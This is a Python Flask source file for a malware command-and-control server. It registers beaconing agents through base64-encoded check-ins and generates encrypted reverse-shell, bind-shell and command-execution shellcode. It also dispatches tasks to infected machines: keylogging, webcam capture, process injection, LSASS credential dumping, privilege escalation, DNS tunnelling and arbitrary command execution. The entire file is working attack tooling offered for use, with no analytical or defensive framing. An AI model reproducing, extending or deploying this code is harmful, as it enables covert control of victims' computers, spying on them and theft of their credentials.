#!/usr/bin/env python
import sys
import os
import platform
import time
import json
import base64
import logging
from datetime import datetime
import threading

from flask import Flask, render_template, request, jsonify

# Add parent directory to Python path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules.shellcode_generator import ShellcodeGenerator
from modules.dns_tunnel import DNSTunnel

# Windows-only modules
IS_WINDOWS = platform.system().lower() == "windows"
if IS_WINDOWS:
    from modules.evasion import Evasion
    from modules.keylogger import Keylogger
    from modules.webcam import WebcamCapture
    from modules.process_injection import ProcessInjector
    from modules.credential_dump import CredentialDump
    from modules.priv_esc import PrivilegeEscalation
    from modules.post_exploit import PostExploit

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

app = Flask(__name__)

# Global components
shellcode_gen = ShellcodeGenerator()
dns_tunnel = DNSTunnel("example.com")  # Replace domain if needed

if IS_WINDOWS:
    evasion = Evasion()
    keylogger = Keylogger()
    webcam = WebcamCapture()
    process_injector = ProcessInjector()
    post_exploit = PostExploit()
    cred_dump = CredentialDump()
    priv_esc = PrivilegeEscalation()

# Storage
agents = {}
tasks = {}
results = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/shellcode')
def shellcode():
    return render_template('shellcode.html')

@app.route('/api/generate_shellcode', methods=['POST'])
def generate_shellcode():
    try:
        data = request.get_json()
        shellcode_type = data.get('type')
        platform = data.get('platform', 'windows')
        encoding = data.get('encoding', 'base64')
        encryption = data.get('encryption', 'none')
        key = data.get('key', '')
        shellcode = None

        if shellcode_type == 'reverse':
            host = data.get('host')
            port = int(data.get('port', 0))
            if not host or not port:
                return jsonify({'error': 'Host and port required'}), 400
            shellcode = shellcode_gen.generate_reverse_shell(host, port, platform)

        elif shellcode_type == 'bind':
            port = int(data.get('port', 0))
            if not port:
                return jsonify({'error': 'Port required'}), 400
            shellcode = shellcode_gen.generate_bind_shell(port, platform)

        elif shellcode_type == 'exec':
            command = data.get('command')
            if not command:
                return jsonify({'error': 'Command required'}), 400
            shellcode = shellcode_gen.generate_exec(command, platform)

        else:
            return jsonify({'error': 'Invalid shellcode type'}), 400

        if shellcode is None:
            return jsonify({'error': 'Shellcode generation failed'}), 500

        if encryption == 'xor':
            shellcode = shellcode_gen.xor_encrypt(shellcode, key or "defaultxor")
        elif encryption == 'aes':
            shellcode = shellcode_gen.aes_encrypt(shellcode, key or "defaultaes")

        encoded = shellcode_gen.encode_shellcode(shellcode, encoding)
        if encoded is None:
            return jsonify({'error': 'Encoding failed'}), 500

        return jsonify({
            'success': True,
            'shellcode': encoded.decode() if isinstance(encoded, bytes) else encoded
        })

    except Exception as e:
        return jsonify({'error': f'Unexpected error: {str(e)}'}), 500

@app.route('/api/agents', methods=['GET'])
def list_agents():
    displayed_agents = []
    for agent_id, data in agents.items():
        display_data = data.copy()
        try:
            display_data['last_seen'] = datetime.fromisoformat(data['last_seen']).strftime("%m/%d/%Y, %I:%M:%S %p")
        except:
            display_data['last_seen'] = "Unknown"
        displayed_agents.append(display_data)
    return jsonify(displayed_agents)

@app.route('/api/agents/register', methods=['POST'])
def register_agent():
    try:
        wrapper = request.get_json()
        encoded_data = wrapper.get('data')

        if not encoded_data:
            return jsonify({'status': 'error', 'message': 'Missing data'}), 400

        decoded_json = base64.b64decode(encoded_data).decode()
        data = json.loads(decoded_json)

        agent_id = data.get('agent_id')
        if agent_id:
            agents[agent_id] = data
            agents[agent_id]['last_seen'] = datetime.now().isoformat()
            logging.info(f"Registered agent: {agent_id}")
            return jsonify({'status': 'success'})

        return jsonify({'status': 'error', 'message': 'Missing agent_id'}), 400

    except Exception as e:
        logging.error(f"Registration error: {str(e)}")
        return jsonify({'status': 'error'}), 500

@app.route('/api/agents/beacon', methods=['POST'])
def agent_beacon():
    try:
        wrapper = request.get_json()
        encoded_data = wrapper.get('data')

        if not encoded_data:
            return jsonify({'status': 'error', 'message': 'Missing data'}), 400

        decoded_json = base64.b64decode(encoded_data).decode()
        data = json.loads(decoded_json)

        agent_id = data.get('agent_id')
        timestamp = datetime.now().isoformat()

        if agent_id:
            if agent_id in agents:
                agents[agent_id]['last_seen'] = timestamp
            else:
                agents[agent_id] = {
                    'agent_id': agent_id,
                    'system_info': data.get('system_info'),
                    'status': data.get('status'),
                    'last_seen': timestamp
                }

            logging.info(f"Beacon received from {agent_id}")
            return jsonify({'status': 'ok', 'message': 'Beacon received'})

        return jsonify({'status': 'error', 'message': 'Missing agent_id'}), 400

    except Exception as e:
        logging.error(f"Beacon error: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/tasks/<agent_id>', methods=['GET'])
def get_tasks(agent_id):
    return jsonify(tasks.get(agent_id, []))

@app.route('/api/tasks', methods=['POST'])
def create_task():
    data = request.get_json()
    agent_id = data.get('agent_id')
    task_type = data.get('type')
    task_data = data.get('data', {})

    if not agent_id or not task_type:
        return jsonify({'status': 'error'}), 400

    task_id = f"task_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    task = {
        'id': task_id,
        'type': task_type,
        'data': task_data,
        'status': 'pending',
        'timestamp': datetime.now().isoformat()
    }

    if agent_id not in tasks:
        tasks[agent_id] = []
    tasks[agent_id].append(task)

    thread = threading.Thread(
        target=execute_task,
        args=(agent_id, task_id, task_type, task_data),
        daemon=True
    )
    thread.start()

    return jsonify({'task_id': task_id})

def execute_task(agent_id, task_id, task_type, task_data):
    try:
        result = None
        if IS_WINDOWS:
            if task_type == 'keylogger':
                result = keylogger.start()
            elif task_type == 'webcam':
                result = webcam.capture()
            elif task_type == 'process_injection':
                result = process_injector.inject(
                    task_data.get('process'),
                    task_data.get('shellcode')
                )
            elif task_type == 'post_exploit':
                result = post_exploit.execute(task_data.get('command'))
            elif task_type == 'credential_dump':
                result = cred_dump.dump_lsass()
            elif task_type == 'privilege_escalation':
                result = priv_esc.check_windows_services()

        if task_type == 'dns_tunnel':
            result = dns_tunnel.start_tunnel()

        if result:
            results[task_id] = {
                'agent_id': agent_id,
                'result': result,
                'timestamp': datetime.now().isoformat()
            }

    except Exception as e:
        logging.error(f"Task error: {str(e)}")
        results[task_id] = {
            'agent_id': agent_id,
            'error': str(e),
            'timestamp': datetime.now().isoformat()
        }

@app.route('/api/results/<task_id>', methods=['GET'])
def get_result(task_id):
    result = results.get(task_id)
    return jsonify(result or {'status': 'not_found'})

@app.route('/api/results', methods=['POST'])
def submit_result():
    data = request.get_json()
    task_id = data.get('task_id')
    agent_id = data.get('agent_id')
    result = data.get('result')

    if task_id and result:
        results[task_id] = {
            'agent_id': agent_id,
            'result': result,
            'timestamp': datetime.now().isoformat()
        }
        return jsonify({'status': 'success'})
    return jsonify({'status': 'error'}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)
